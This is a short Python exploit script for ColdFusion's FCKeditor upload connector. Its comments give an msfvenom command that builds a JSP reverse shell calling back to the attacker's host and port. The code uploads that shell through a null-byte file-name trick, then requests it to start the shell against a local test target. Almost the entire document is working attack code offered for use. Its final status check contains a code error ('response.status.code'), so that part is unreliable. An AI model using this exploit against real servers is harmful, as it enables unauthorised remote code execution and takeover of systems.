
# Send post request to /CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm?Command=FileUpload&Type=File&CurrentFolder=
# Generate payload = msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.jsp

import requests
import random
import string

filename = ''.join(random.choices(string.ascii_uppercase + string.digits, k=10))

jspPayload = {'newfile': (filename + '.txt',open('/home/chobo/Desktop/codeRepo/ColdFusionRemoteFileUpload/shell.jsp', 'rb'))}

response = requests.post("http://127.0.0.1:1445/CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm?Command=FileUpload&Type=File&CurrentFolder=/"+filename+".jsp%00",
                         files=jspPayload)

if response.status_code == 200:
    url = "http://127.0.0.1:1445/userfiles/file/" + filename + ".jsp"
    print("Shell uploading successfully. Trying to access it at url :" + url)
    response = requests.get(url)
    if response.status.code == 200:
        print("Shell has been started!")
    else:
        print("Failed to start reverse shell")